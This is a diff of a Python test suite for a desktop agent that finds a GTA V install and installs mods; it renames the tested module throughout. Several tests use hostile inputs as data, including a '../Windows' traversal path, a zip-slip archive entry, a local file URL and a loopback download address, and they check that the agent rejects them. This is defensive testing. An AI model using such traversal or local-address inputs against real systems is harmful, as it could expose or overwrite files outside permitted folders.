@@ -22,7 +22,7 @@ from unittest import mock
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
-import gta5_agent
+import agent_core
 
 
 def _guard_screenshot() -> dict[str, object]:
@@ -182,78 +182,78 @@ class AgentToolTests(unittest.TestCase):
         self.temp = tempfile.TemporaryDirectory()
         self.addCleanup(self.temp.cleanup)
         self.root = Path(self.temp.name)
-        self.original_workspace = gta5_agent.WORKSPACE
-        self.original_cache = gta5_agent._game_cache
-        self.original_min_exe = gta5_agent.MIN_EXE_BYTES
-        self.original_volumes = gta5_agent._volumes
-        self.original_downloads = gta5_agent.downloads_override
-        self.original_start_menu = gta5_agent.start_menu_override
-        self.original_start_target = gta5_agent._start_target
-        self.original_screenshot = gta5_agent.screenshot_override
-        self.original_webcam = gta5_agent.webcam_override
-        self.original_screen_size = gta5_agent.screen_size_override
-        self.original_pointer = gta5_agent.pointer_override
-        self.original_navigate = gta5_agent.navigate_override
-        self.original_keys = gta5_agent.windows_input_override
-        self.original_clipboard = gta5_agent.clipboard_override
-        self.original_turn = gta5_agent._turn_request
-        self.original_plan = gta5_agent._task_plan
-        self.original_background = gta5_agent.background_services_enabled
-        self.original_search_root = gta5_agent.search_root_override
-        self.original_chime = gta5_agent.chime_override
-        self.original_wake = gta5_agent.wake_listen_override
-        self.original_command_listen = gta5_agent.command_listen_override
-        self.original_process = gta5_agent.process_override
-        self.original_window = gta5_agent.window_override
-        self.original_clock = gta5_agent.scheduler_clock
-        self.original_schedule_module = gta5_agent.schedule_module_override
-        self.original_blender_exe = gta5_agent.blender_executable_override
-        self.original_blender_runner = gta5_agent.blender_runner_override
-        self.original_blender_notify = gta5_agent.blender_notify_override
-        self.original_blender_open = gta5_agent.blender_open_override
-        self.original_program_runner = gta5_agent.program_runner_override
-        self.original_remote_transport = gta5_agent.remote_transport_override
-        self.original_remote_reply = gta5_agent.remote_reply_override
-        self.original_telegram_voice = gta5_agent.telegram_voice_transcriber_override
-        self.original_ffmpeg_exe = gta5_agent.ffmpeg_executable_override
-        self.original_media_runner = gta5_agent.media_runner_override
-        self.original_git_runner = gta5_agent.git_runner_override
-        self.original_browser_runner = gta5_agent.browser_runner_override
-        self.original_desktop = gta5_agent.desktop_override
-        self.original_self_heal = gta5_agent.self_heal_enabled
-        self.original_heal_runner = gta5_agent.heal_runner_override
-        self.original_heal_rewriter = gta5_agent.heal_rewriter_override
-        self.original_mcp_transport = gta5_agent.mcp_transport_override
-        self.original_mcp_config = gta5_agent.mcp_config_override
-        self.original_network = gta5_agent.network_up_override
-        self.original_ollama = gta5_agent.ollama_transport_override
-        self.original_ollama_up = gta5_agent.ollama_reachable_override
-        self.original_genai_client = gta5_agent.genai_client_override
-        self.original_recorder = gta5_agent.recorder_override
-        self.original_transcriber = gta5_agent.transcriber_override
-        self.original_documents = gta5_agent.documents_override
-        self.original_clipboard_image = gta5_agent.clipboard_image_override
-        self.original_idle_seconds = gta5_agent.idle_seconds_override
-        self.original_idle_limit = gta5_agent.idle_task_seconds_override
-        self.original_idle_runner = gta5_agent.idle_runner_override
-        self.original_delegate_runner = gta5_agent.delegate_runner_override
-        self.original_confirm_listener = gta5_agent.confirm_listener_override
-        self.original_confirm_speaker = gta5_agent.confirm_speaker_override
-        self.original_network_runner = gta5_agent.network_runner_override
-        self.original_shutdown_runner = gta5_agent.shutdown_runner_override
-        self.original_diagnostics = gta5_agent.diagnostics_override
-        self.original_voice_mode = gta5_agent.voice_mode_active
-        self.original_audio_outputs = gta5_agent.audio_output_override
-        self.original_checkin_minutes = gta5_agent.checkin_idle_minutes_override
-        self.original_checkin_listener = gta5_agent.checkin_listener_override
-        self.original_checkin_speaker = gta5_agent.checkin_speaker_override
-        self.original_live_frame = gta5_agent.live_frame_override
-        self.original_stream_process = gta5_agent.stream_process_override
-        self.original_live_bind = gta5_agent.live_bind_override
-        self.original_live_advertise = gta5_agent.live_advertise_override
-        self.original_gmail = gta5_agent.gmail_transport_override
-        self.original_contacts = gta5_agent.contacts_override
-        self.original_local_turn = gta5_agent._turn_is_local
+        self.original_workspace = agent_core.WORKSPACE
+        self.original_cache = agent_core._game_cache
+        self.original_min_exe = agent_core.MIN_EXE_BYTES
+        self.original_volumes = agent_core._volumes
+        self.original_downloads = agent_core.downloads_override
+        self.original_start_menu = agent_core.start_menu_override
+        self.original_start_target = agent_core._start_target
+        self.original_screenshot = agent_core.screenshot_override
+        self.original_webcam = agent_core.webcam_override
+        self.original_screen_size = agent_core.screen_size_override
+        self.original_pointer = agent_core.pointer_override
+        self.original_navigate = agent_core.navigate_override
+        self.original_keys = agent_core.windows_input_override
+        self.original_clipboard = agent_core.clipboard_override
+        self.original_turn = agent_core._turn_request
+        self.original_plan = agent_core._task_plan
+        self.original_background = agent_core.background_services_enabled
+        self.original_search_root = agent_core.search_root_override
+        self.original_chime = agent_core.chime_override
+        self.original_wake = agent_core.wake_listen_override
+        self.original_command_listen = agent_core.command_listen_override
+        self.original_process = agent_core.process_override
+        self.original_window = agent_core.window_override
+        self.original_clock = agent_core.scheduler_clock
+        self.original_schedule_module = agent_core.schedule_module_override
+        self.original_blender_exe = agent_core.blender_executable_override
+        self.original_blender_runner = agent_core.blender_runner_override
+        self.original_blender_notify = agent_core.blender_notify_override
+        self.original_blender_open = agent_core.blender_open_override
+        self.original_program_runner = agent_core.program_runner_override
+        self.original_remote_transport = agent_core.remote_transport_override
+        self.original_remote_reply = agent_core.remote_reply_override
+        self.original_telegram_voice = agent_core.telegram_voice_transcriber_override
+        self.original_ffmpeg_exe = agent_core.ffmpeg_executable_override
+        self.original_media_runner = agent_core.media_runner_override
+        self.original_git_runner = agent_core.git_runner_override
+        self.original_browser_runner = agent_core.browser_runner_override
+        self.original_desktop = agent_core.desktop_override
+        self.original_self_heal = agent_core.self_heal_enabled
+        self.original_heal_runner = agent_core.heal_runner_override
+        self.original_heal_rewriter = agent_core.heal_rewriter_override
+        self.original_mcp_transport = agent_core.mcp_transport_override
+        self.original_mcp_config = agent_core.mcp_config_override
+        self.original_network = agent_core.network_up_override
+        self.original_ollama = agent_core.ollama_transport_override
+        self.original_ollama_up = agent_core.ollama_reachable_override
+        self.original_genai_client = agent_core.genai_client_override
+        self.original_recorder = agent_core.recorder_override
+        self.original_transcriber = agent_core.transcriber_override
+        self.original_documents = agent_core.documents_override
+        self.original_clipboard_image = agent_core.clipboard_image_override
+        self.original_idle_seconds = agent_core.idle_seconds_override
+        self.original_idle_limit = agent_core.idle_task_seconds_override
+        self.original_idle_runner = agent_core.idle_runner_override
+        self.original_delegate_runner = agent_core.delegate_runner_override
+        self.original_confirm_listener = agent_core.confirm_listener_override
+        self.original_confirm_speaker = agent_core.confirm_speaker_override
+        self.original_network_runner = agent_core.network_runner_override
+        self.original_shutdown_runner = agent_core.shutdown_runner_override
+        self.original_diagnostics = agent_core.diagnostics_override
+        self.original_voice_mode = agent_core.voice_mode_active
+        self.original_audio_outputs = agent_core.audio_output_override
+        self.original_checkin_minutes = agent_core.checkin_idle_minutes_override
+        self.original_checkin_listener = agent_core.checkin_listener_override
+        self.original_checkin_speaker = agent_core.checkin_speaker_override
+        self.original_live_frame = agent_core.live_frame_override
+        self.original_stream_process = agent_core.stream_process_override
+        self.original_live_bind = agent_core.live_bind_override
+        self.original_live_advertise = agent_core.live_advertise_override
+        self.original_gmail = agent_core.gmail_transport_override
+        self.original_contacts = agent_core.contacts_override
+        self.original_local_turn = agent_core._turn_is_local
         self._drive_env = {
             key: os.environ.pop(key, None)
             for key in ("EXTERNAL_DRIVE_LABEL", "EXTERNAL_DRIVE_PATH", "STORAGE_DIR")
@@ -299,76 +299,76 @@ class AgentToolTests(unittest.TestCase):
 
         self.original_tts_transport = tts_engine.transport_override
         tts_engine.transport_override = None
-        gta5_agent.WORKSPACE = self.root / "workspace"
-        gta5_agent._game_cache = None
-        gta5_agent.MIN_EXE_BYTES = 1
-        gta5_agent.downloads_override = None
-        gta5_agent.screenshot_override = _guard_screenshot
-        gta5_agent.webcam_override = _guard_webcam
-        gta5_agent.screen_size_override = (1920, 1080)
-        gta5_agent.pointer_override = _guard_pointer
-        gta5_agent.navigate_override = _guard_navigate
-        gta5_agent.windows_input_override = _guard_keys
-        gta5_agent.clipboard_override = _guard_clipboard
-        gta5_agent.background_services_enabled = False
-        gta5_agent.search_root_override = self.root / "pedro"
-        gta5_agent.search_root_override.mkdir()
-        gta5_agent.chime_override = _guard_chime
-        gta5_agent.wake_listen_override = _guard_wake
-        gta5_agent.command_listen_override = _guard_wake
-        gta5_agent.process_override = _guard_process
-        gta5_agent.window_override = _guard_window
-        gta5_agent.scheduler_clock = None
-        gta5_agent.schedule_module_override = None
-        gta5_agent.blender_executable_override = None
-        gta5_agent.blender_runner_override = _guard_blender
-        gta5_agent.blender_notify_override = _guard_blender_notify
-        gta5_agent.blender_open_override = _guard_blender_open
-        gta5_agent.program_runner_override = _guard_program
-        gta5_agent.remote_transport_override = None
-        gta5_agent.remote_reply_override = None
-        gta5_agent.telegram_voice_transcriber_override = _guard_telegram_voice
-        gta5_agent.ffmpeg_executable_override = Path("ffmpeg-test")
-        gta5_agent.media_runner_override = _guard_ffmpeg
-        gta5_agent.git_runner_override = _guard_git
-        gta5_agent.browser_runner_override = _guard_browser
-        gta5_agent.desktop_override = self.root / "Desktop"
-        gta5_agent.self_heal_enabled = False
-        gta5_agent.heal_runner_override = _guard_heal
-        gta5_agent.heal_rewriter_override = _guard_rewriter
-        gta5_agent.mcp_transport_override = _guard_mcp
-        gta5_agent.mcp_config_override = self.root / "no-mcp-servers.json"
-        gta5_agent.network_up_override = True
-        gta5_agent.ollama_transport_override = None
-        gta5_agent.ollama_reachable_override = False
-        gta5_agent.genai_client_override = _guard_genai
-        gta5_agent.recorder_override = _guard_recorder
-        gta5_agent.transcriber_override = _guard_transcriber
-        gta5_agent.documents_override = self.root / "Documents"
-        gta5_agent.clipboard_image_override = _guard_clipboard_image
-        gta5_agent.idle_seconds_override = 0
-        gta5_agent.idle_task_seconds_override = None
-        gta5_agent.idle_runner_override = _guard_idle
-        gta5_agent.delegate_runner_override = _guard_delegate
-        gta5_agent.confirm_listener_override = _guard_confirm
-        gta5_agent.confirm_speaker_override = _guard_confirm_speak
-        gta5_agent.network_runner_override = _guard_network
-        gta5_agent.shutdown_runner_override = _guard_shutdown
-        gta5_agent.diagnostics_override = _guard_diagnostics
-        gta5_agent.voice_mode_active = False
-        gta5_agent.audio_output_override = None
-        gta5_agent.checkin_idle_minutes_override = None
-        gta5_agent.checkin_listener_override = _guard_checkin
-        gta5_agent.checkin_speaker_override = _guard_checkin_speak
-        gta5_agent.live_frame_override = _guard_live_frame
-        gta5_agent.stream_process_override = _guard_stream_process
-        gta5_agent.live_bind_override = ("127.0.0.1", 0)
-        gta5_agent.live_advertise_override = "127.0.0.1"
-        gta5_agent.gmail_transport_override = _guard_gmail
-        gta5_agent.contacts_override = []
-        gta5_agent._turn_is_local = False
-        gta5_agent.reset_background_state()
-        gta5_agent.begin_task_turn("")
+        agent_core.WORKSPACE = self.root / "workspace"
+        agent_core._game_cache = None
+        agent_core.MIN_EXE_BYTES = 1
+        agent_core.downloads_override = None
+        agent_core.screenshot_override = _guard_screenshot
+        agent_core.webcam_override = _guard_webcam
+        agent_core.screen_size_override = (1920, 1080)
+        agent_core.pointer_override = _guard_pointer
+        agent_core.navigate_override = _guard_navigate
+        agent_core.windows_input_override = _guard_keys
+        agent_core.clipboard_override = _guard_clipboard
+        agent_core.background_services_enabled = False
+        agent_core.search_root_override = self.root / "pedro"
+        agent_core.search_root_override.mkdir()
+        agent_core.chime_override = _guard_chime
+        agent_core.wake_listen_override = _guard_wake
+        agent_core.command_listen_override = _guard_wake
+        agent_core.process_override = _guard_process
+        agent_core.window_override = _guard_window
+        agent_core.scheduler_clock = None
+        agent_core.schedule_module_override = None
+        agent_core.blender_executable_override = None
+        agent_core.blender_runner_override = _guard_blender
+        agent_core.blender_notify_override = _guard_blender_notify
+        agent_core.blender_open_override = _guard_blender_open
+        agent_core.program_runner_override = _guard_program
+        agent_core.remote_transport_override = None
+        agent_core.remote_reply_override = None
+        agent_core.telegram_voice_transcriber_override = _guard_telegram_voice
+        agent_core.ffmpeg_executable_override = Path("ffmpeg-test")
+        agent_core.media_runner_override = _guard_ffmpeg
+        agent_core.git_runner_override = _guard_git
+        agent_core.browser_runner_override = _guard_browser
+        agent_core.desktop_override = self.root / "Desktop"
+        agent_core.self_heal_enabled = False
+        agent_core.heal_runner_override = _guard_heal
+        agent_core.heal_rewriter_override = _guard_rewriter
+        agent_core.mcp_transport_override = _guard_mcp
+        agent_core.mcp_config_override = self.root / "no-mcp-servers.json"
+        agent_core.network_up_override = True
+        agent_core.ollama_transport_override = None
+        agent_core.ollama_reachable_override = False
+        agent_core.genai_client_override = _guard_genai
+        agent_core.recorder_override = _guard_recorder
+        agent_core.transcriber_override = _guard_transcriber
+        agent_core.documents_override = self.root / "Documents"
+        agent_core.clipboard_image_override = _guard_clipboard_image
+        agent_core.idle_seconds_override = 0
+        agent_core.idle_task_seconds_override = None
+        agent_core.idle_runner_override = _guard_idle
+        agent_core.delegate_runner_override = _guard_delegate
+        agent_core.confirm_listener_override = _guard_confirm
+        agent_core.confirm_speaker_override = _guard_confirm_speak
+        agent_core.network_runner_override = _guard_network
+        agent_core.shutdown_runner_override = _guard_shutdown
+        agent_core.diagnostics_override = _guard_diagnostics
+        agent_core.voice_mode_active = False
+        agent_core.audio_output_override = None
+        agent_core.checkin_idle_minutes_override = None
+        agent_core.checkin_listener_override = _guard_checkin
+        agent_core.checkin_speaker_override = _guard_checkin_speak
+        agent_core.live_frame_override = _guard_live_frame
+        agent_core.stream_process_override = _guard_stream_process
+        agent_core.live_bind_override = ("127.0.0.1", 0)
+        agent_core.live_advertise_override = "127.0.0.1"
+        agent_core.gmail_transport_override = _guard_gmail
+        agent_core.contacts_override = []
+        agent_core._turn_is_local = False
+        agent_core.reset_background_state()
+        agent_core.begin_task_turn("")
         import confirm_action
         import emotion
         import routine_macros
@@ -398,83 +398,83 @@ class AgentToolTests(unittest.TestCase):
         confirm_action.reset()
         voice_checkin.reset()
         routine_macros.reset()
-        gta5_agent._disarm_playback()
+        agent_core._disarm_playback()
         self.addCleanup(self.restore)
 
     def restore(self) -> None:
-        gta5_agent.WORKSPACE = self.original_workspace
-        gta5_agent._game_cache = self.original_cache
-        gta5_agent.MIN_EXE_BYTES = self.original_min_exe
-        gta5_agent._volumes = self.original_volumes
-        gta5_agent.downloads_override = self.original_downloads
-        gta5_agent.start_menu_override = self.original_start_menu
-        gta5_agent._start_target = self.original_start_target
-        gta5_agent.screenshot_override = self.original_screenshot
-        gta5_agent.webcam_override = self.original_webcam
-        gta5_agent.screen_size_override = self.original_screen_size
-        gta5_agent.pointer_override = self.original_pointer
-        gta5_agent.navigate_override = self.original_navigate
-        gta5_agent.windows_input_override = self.original_keys
-        gta5_agent.clipboard_override = self.original_clipboard
-        gta5_agent._turn_request = self.original_turn
-        gta5_agent._task_plan = self.original_plan
-        gta5_agent.background_services_enabled = self.original_background
-        gta5_agent.search_root_override = self.original_search_root
-        gta5_agent.chime_override = self.original_chime
-        gta5_agent.wake_listen_override = self.original_wake
-        gta5_agent.command_listen_override = self.original_command_listen
-        gta5_agent.process_override = self.original_process
-        gta5_agent.window_override = self.original_window
-        gta5_agent.scheduler_clock = self.original_clock
-        gta5_agent.schedule_module_override = self.original_schedule_module
-        gta5_agent.reset_background_state()
-        gta5_agent.blender_executable_override = self.original_blender_exe
-        gta5_agent.blender_runner_override = self.original_blender_runner
-        gta5_agent.blender_notify_override = self.original_blender_notify
-        gta5_agent.blender_open_override = self.original_blender_open
-        gta5_agent.program_runner_override = self.original_program_runner
-        gta5_agent.remote_transport_override = self.original_remote_transport
-        gta5_agent.remote_reply_override = self.original_remote_reply
-        gta5_agent.telegram_voice_transcriber_override = self.original_telegram_voice
-        gta5_agent.ffmpeg_executable_override = self.original_ffmpeg_exe
-        gta5_agent.media_runner_override = self.original_media_runner
-        gta5_agent.git_runner_override = self.original_git_runner
-        gta5_agent.browser_runner_override = self.original_browser_runner
-        gta5_agent.desktop_override = self.original_desktop
-        gta5_agent.self_heal_enabled = self.original_self_heal
-        gta5_agent.heal_runner_override = self.original_heal_runner
-        gta5_agent.heal_rewriter_override = self.original_heal_rewriter
-        gta5_agent.mcp_transport_override = self.original_mcp_transport
-        gta5_agent.mcp_config_override = self.original_mcp_config
-        gta5_agent.network_up_override = self.original_network
-        gta5_agent.ollama_transport_override = self.original_ollama
-        gta5_agent.ollama_reachable_override = self.original_ollama_up
-        gta5_agent.genai_client_override = self.original_genai_client
-        gta5_agent.recorder_override = self.original_recorder
-        gta5_agent.transcriber_override = self.original_transcriber
-        gta5_agent.documents_override = self.original_documents
-        gta5_agent.clipboard_image_override = self.original_clipboard_image
-        gta5_agent.idle_seconds_override = self.original_idle_seconds
-        gta5_agent.idle_task_seconds_override = self.original_idle_limit
-        gta5_agent.idle_runner_override = self.original_idle_runner
-        gta5_agent.delegate_runner_override = self.original_delegate_runner
-        gta5_agent.confirm_listener_override = self.original_confirm_listener
-        gta5_agent.confirm_speaker_override = self.original_confirm_speaker
-        gta5_agent.network_runner_override = self.original_network_runner
-        gta5_agent.shutdown_runner_override = self.original_shutdown_runner
-        gta5_agent.diagnostics_override = self.original_diagnostics
-        gta5_agent.voice_mode_active = self.original_voice_mode
-        gta5_agent.audio_output_override = self.original_audio_outputs
-        gta5_agent.checkin_idle_minutes_override = self.original_checkin_minutes
-        gta5_agent.checkin_listener_override = self.original_checkin_listener
-        gta5_agent.checkin_speaker_override = self.original_checkin_speaker
-        gta5_agent.live_frame_override = self.original_live_frame
-        gta5_agent.stream_process_override = self.original_stream_process
-        gta5_agent.live_bind_override = self.original_live_bind
-        gta5_agent.live_advertise_override = self.original_live_advertise
-        gta5_agent.gmail_transport_override = self.original_gmail
-        gta5_agent.contacts_override = self.original_contacts
-        gta5_agent._turn_is_local = self.original_local_turn
+        agent_core.WORKSPACE = self.original_workspace
+        agent_core._game_cache = self.original_cache
+        agent_core.MIN_EXE_BYTES = self.original_min_exe
+        agent_core._volumes = self.original_volumes
+        agent_core.downloads_override = self.original_downloads
+        agent_core.start_menu_override = self.original_start_menu
+        agent_core._start_target = self.original_start_target
+        agent_core.screenshot_override = self.original_screenshot
+        agent_core.webcam_override = self.original_webcam
+        agent_core.screen_size_override = self.original_screen_size
+        agent_core.pointer_override = self.original_pointer
+        agent_core.navigate_override = self.original_navigate
+        agent_core.windows_input_override = self.original_keys
+        agent_core.clipboard_override = self.original_clipboard
+        agent_core._turn_request = self.original_turn
+        agent_core._task_plan = self.original_plan
+        agent_core.background_services_enabled = self.original_background
+        agent_core.search_root_override = self.original_search_root
+        agent_core.chime_override = self.original_chime
+        agent_core.wake_listen_override = self.original_wake
+        agent_core.command_listen_override = self.original_command_listen
+        agent_core.process_override = self.original_process
+        agent_core.window_override = self.original_window
+        agent_core.scheduler_clock = self.original_clock
+        agent_core.schedule_module_override = self.original_schedule_module
+        agent_core.reset_background_state()
+        agent_core.blender_executable_override = self.original_blender_exe
+        agent_core.blender_runner_override = self.original_blender_runner
+        agent_core.blender_notify_override = self.original_blender_notify
+        agent_core.blender_open_override = self.original_blender_open
+        agent_core.program_runner_override = self.original_program_runner
+        agent_core.remote_transport_override = self.original_remote_transport
+        agent_core.remote_reply_override = self.original_remote_reply
+        agent_core.telegram_voice_transcriber_override = self.original_telegram_voice
+        agent_core.ffmpeg_executable_override = self.original_ffmpeg_exe
+        agent_core.media_runner_override = self.original_media_runner
+        agent_core.git_runner_override = self.original_git_runner
+        agent_core.browser_runner_override = self.original_browser_runner
+        agent_core.desktop_override = self.original_desktop
+        agent_core.self_heal_enabled = self.original_self_heal
+        agent_core.heal_runner_override = self.original_heal_runner
+        agent_core.heal_rewriter_override = self.original_heal_rewriter
+        agent_core.mcp_transport_override = self.original_mcp_transport
+        agent_core.mcp_config_override = self.original_mcp_config
+        agent_core.network_up_override = self.original_network
+        agent_core.ollama_transport_override = self.original_ollama
+        agent_core.ollama_reachable_override = self.original_ollama_up
+        agent_core.genai_client_override = self.original_genai_client
+        agent_core.recorder_override = self.original_recorder
+        agent_core.transcriber_override = self.original_transcriber
+        agent_core.documents_override = self.original_documents
+        agent_core.clipboard_image_override = self.original_clipboard_image
+        agent_core.idle_seconds_override = self.original_idle_seconds
+        agent_core.idle_task_seconds_override = self.original_idle_limit
+        agent_core.idle_runner_override = self.original_idle_runner
+        agent_core.delegate_runner_override = self.original_delegate_runner
+        agent_core.confirm_listener_override = self.original_confirm_listener
+        agent_core.confirm_speaker_override = self.original_confirm_speaker
+        agent_core.network_runner_override = self.original_network_runner
+        agent_core.shutdown_runner_override = self.original_shutdown_runner
+        agent_core.diagnostics_override = self.original_diagnostics
+        agent_core.voice_mode_active = self.original_voice_mode
+        agent_core.audio_output_override = self.original_audio_outputs
+        agent_core.checkin_idle_minutes_override = self.original_checkin_minutes
+        agent_core.checkin_listener_override = self.original_checkin_listener
+        agent_core.checkin_speaker_override = self.original_checkin_speaker
+        agent_core.live_frame_override = self.original_live_frame
+        agent_core.stream_process_override = self.original_stream_process
+        agent_core.live_bind_override = self.original_live_bind
+        agent_core.live_advertise_override = self.original_live_advertise
+        agent_core.gmail_transport_override = self.original_gmail
+        agent_core.contacts_override = self.original_contacts
+        agent_core._turn_is_local = self.original_local_turn
         os.environ.pop("RULES_FILE", None)
         self._rules_dir.cleanup()
         import rules as _rules
@@ -508,7 +508,7 @@ class AgentToolTests(unittest.TestCase):
         game = self.root / "Grand Theft Auto V"
         game.mkdir()
         (game / "GTA5.exe").write_bytes(b"exe")
-        gta5_agent._game_cache = {
+        agent_core._game_cache = {
             "path": str(game),
             "volume_label": "GameDrive",
             "drive": "E:",
@@ -520,7 +520,7 @@ class AgentToolTests(unittest.TestCase):
         game = drive / "Games" / "Grand Theft Auto V"
         game.mkdir(parents=True)
         (game / "GTA5.exe").write_bytes(b"exe")
-        found = gta5_agent._search_for_gta5(drive)
+        found = agent_core._search_for_gta5(drive)
         self.assertEqual(found, game)
 
     def test_locate_matches_volume_label(self) -> None:
@@ -528,29 +528,29 @@ class AgentToolTests(unittest.TestCase):
         game = drive / "Games" / "Grand Theft Auto V"
         game.mkdir(parents=True)
         (game / "GTA5.exe").write_bytes(b"exe")
-        gta5_agent._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
-        result = gta5_agent.locate_gta5_directory(rescan=True)
+        agent_core._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
+        result = agent_core.locate_gta5_directory(rescan=True)
         self.assertTrue(result["ok"])
         self.assertEqual(Path(result["game_root"]), game)
 
-        gta5_agent._volumes = lambda: []
-        cached = gta5_agent.locate_gta5_directory(rescan=False)
+        agent_core._volumes = lambda: []
+        cached = agent_core.locate_gta5_directory(rescan=False)
         self.assertTrue(cached["ok"])
         self.assertTrue(cached["cached"])
 
     def test_locate_reports_missing_label(self) -> None:
-        gta5_agent._volumes = lambda: [("E:\\", "Other Disk")]
-        result = gta5_agent.locate_gta5_directory(rescan=True, volume_label="GameDrive")
+        agent_core._volumes = lambda: [("E:\\", "Other Disk")]
+        result = agent_core.locate_gta5_directory(rescan=True, volume_label="GameDrive")
         self.assertFalse(result["ok"])
         self.assertIn("GameDrive", result["error"])
         self.assertIn("Other Disk", result["error"])
 
     def test_create_directory_stays_inside_game(self) -> None:
         game = self.make_game()
-        created = gta5_agent.create_directory("scripts/AddonPeds")
+        created = agent_core.create_directory("scripts/AddonPeds")
         self.assertTrue(created["ok"])
         self.assertTrue((game / "scripts" / "AddonPeds").is_dir())
-        escaped = gta5_agent.create_directory("../Windows")
+        escaped = agent_core.create_directory("../Windows")
         self.assertFalse(escaped["ok"])
         self.assertIn("escapes", escaped["error"])
 
@@ -558,17 +558,17 @@ class AgentToolTests(unittest.TestCase):
         game = self.make_game()
         source = self.root / "ScriptHookV.dll"
         source.write_bytes(b"dll")
-        copied = gta5_agent.copy_mod_files(str(source), ".")
+        copied = agent_core.copy_mod_files(str(source), ".")
         self.assertTrue(copied["ok"])
         self.assertEqual((game / "ScriptHookV.dll").read_bytes(), b"dll")
 
-        again = gta5_agent.copy_mod_files(str(source), ".")
+        again = agent_core.copy_mod_files(str(source), ".")
         self.assertFalse(again["ok"])
         self.assertIn("Already exists", again["error"])
 
         exe = self.root / "patch.exe"
         exe.write_bytes(b"nope")
-        refused = gta5_agent.copy_mod_files(str(exe), ".")
+        refused = agent_core.copy_mod_files(str(exe), ".")
         self.assertFalse(refused["ok"])
         self.assertIn("executable", refused["error"])
         self.assertEqual((game / "GTA5.exe").read_bytes(), b"exe")
@@ -578,7 +578,7 @@ class AgentToolTests(unittest.TestCase):
         folder = self.root / "scripts"
         folder.mkdir()
         (folder / "MyMod.dll").write_bytes(b"mod")
-        result = gta5_agent.copy_mod_files(str(folder), "scripts")
+        result = agent_core.copy_mod_files(str(folder), "scripts")
         self.assertTrue(result["ok"])
         self.assertEqual((game / "scripts" / "MyMod.dll").read_bytes(), b"mod")
 
@@ -594,7 +594,7 @@ class AgentToolTests(unittest.TestCase):
         model.write_bytes(b"ytd")
         (source / "launcher.exe").write_bytes(b"bad")
 
-        result = gta5_agent.integrate_custom_assets(str(source), pack_name="ignored")
+        result = agent_core.integrate_custom_assets(str(source), pack_name="ignored")
         self.assertTrue(result["ok"])
         self.assertEqual((game / "ScriptHookV.dll").read_bytes(), b"hook")
         self.assertEqual((game / "trainer.asi").read_bytes(), b"asi")
@@ -610,7 +610,7 @@ class AgentToolTests(unittest.TestCase):
         source.mkdir()
         (source / "hero.ydd").write_bytes(b"ydd")
         (source / "hero.yft").write_bytes(b"yft")
-        result = gta5_agent.integrate_custom_assets(
+        result = agent_core.integrate_custom_assets(
             str(source),
             pack_name="horror ped",
             layout="addon_peds",
@@ -626,7 +626,7 @@ class AgentToolTests(unittest.TestCase):
         with zipfile.ZipFile(good, "w") as archive:
             archive.writestr("pack/readme.txt", "hello")
             archive.writestr("pack/hero.ytd", "tex")
-        summary = gta5_agent._extract_zip(good, dest)
+        summary = agent_core._extract_zip(good, dest)
         self.assertEqual(summary["files_written"], 2)
         self.assertEqual((dest / "pack" / "readme.txt").read_text(encoding="utf-8"), "hello")
 
@@ -634,16 +634,16 @@ class AgentToolTests(unittest.TestCase):
         with zipfile.ZipFile(slipped, "w") as archive:
             archive.writestr("../outside.txt", "nope")
         with self.assertRaises(ValueError):
-            gta5_agent._extract_zip(slipped, self.root / "bad-out")
+            agent_core._extract_zip(slipped, self.root / "bad-out")
         self.assertFalse((self.root / "outside.txt").exists())
 
     def test_download_rejects_non_http_and_local_addresses(self) -> None:
-        file_url = gta5_agent.download_and_extract_zip("file:///C:/Windows/notepad.exe")
+        file_url = agent_core.download_and_extract_zip("file:///C:/Windows/notepad.exe")
         self.assertFalse(file_url["ok"])
-        local = gta5_agent.download_and_extract_zip("http://127.0.0.1/mod.zip")
+        local = agent_core.download_and_extract_zip("http://127.0.0.1/mod.zip")
         self.assertFalse(local["ok"])
         self.assertIn("non-public", local["error"])
-        missing = gta5_agent.download_and_extract_zip("")
+        missing = agent_core.download_and_extract_zip("")
         self.assertFalse(missing["ok"])
 
     def test_archive_links_are_extracted_from_html(self) -> None:
@@ -658,7 +658,7 @@ class AgentToolTests(unittest.TestCase):
           <a href="javascript:void(0)">nope</a>
         </body></html>
         """
-        links = gta5_agent._archive_links_from_html(html, "https://mods.example.com/page")
+        links = agent_core._archive_links_from_html(html, "https://mods.example.com/page")
         self.assertEqual(
             links,
             [
@@ -669,7 +669,7 @@ class AgentToolTests(unittest.TestCase):
         )
 
     def test_search_refuses_game_repacks(self) -> None:
-        result = gta5_agent.search_and_find_mod_download("gta v fitgirl repack")
+        result = agent_core.search_and_find_mod_download("gta v fitgirl repack")
         self.assertFalse(result["ok"])
         self.assertIn("does not download", result["error"])
 
@@ -681,13 +681,13 @@ class AgentToolTests(unittest.TestCase):
             packed.writestr("scripts/Zombies.dll", "z")
         with zipfile.ZipFile(folder / "unrelated.zip", "w") as packed:
             packed.writestr("a.txt", "a")
-        gta5_agent.downloads_override = folder
+        agent_core.downloads_override = folder
 
-        found = gta5_agent.scan_user_downloads_folder("Simple Zombies Reborn")
+        found = agent_core.scan_user_downloads_folder("Simple Zombies Reborn")
         self.assertTrue(found["ok"])
         self.assertEqual(found["matches"][0]["name"], "simple-zombies-reborn.zip")
 
-        extracted = gta5_agent.scan_user_downloads_folder(
+        extracted = agent_core.scan_user_downloads_folder(
             "Simple Zombies Reborn",
             extract=True,
         )
@@ -695,7 +695,7 @@ class AgentToolTests(unittest.TestCase):
         extracted_root = Path(extracted["extracted_root"])
         self.assertTrue((extracted_root / "Zombies.dll").is_file())
         self.assertTrue(archive.is_file())
-        missed = gta5_agent.scan_user_downloads_folder("missing mod name", extract=True)
+        missed = agent_core.scan_user_downloads_folder("missing mod name", extract=True)
         self.assertFalse(missed["ok"])
 
     def test_daily_quota_message_is_short(self) -> None:
@@ -704,8 +704,8 @@ class AgentToolTests(unittest.TestCase):
             "generativelanguage.googleapis.com/generate_content_free_tier_requests, "
             "limit: 20, model: gemini-3.8-flash. Please retry in 15h3m35.9s."
         )
-        self.assertTrue(gta5_agent._is_daily_quota(error))
-        message = gta5_agent._quota_message(error)
+        self.assertTrue(agent_core._is_daily_quota(error))
+        message = agent_core._quota_message(error)
         self.assertIn("gemini-3.8-flash", message)
         self.assertIn("20", message)
         self.assertIn("15h", message)
@@ -716,43 +716,43 @@ class AgentToolTests(unittest.TestCase):
             10053,
             "An established connection was aborted by the software in your host machine",
         )
-        self.assertTrue(gta5_agent._transient_network_error(error))
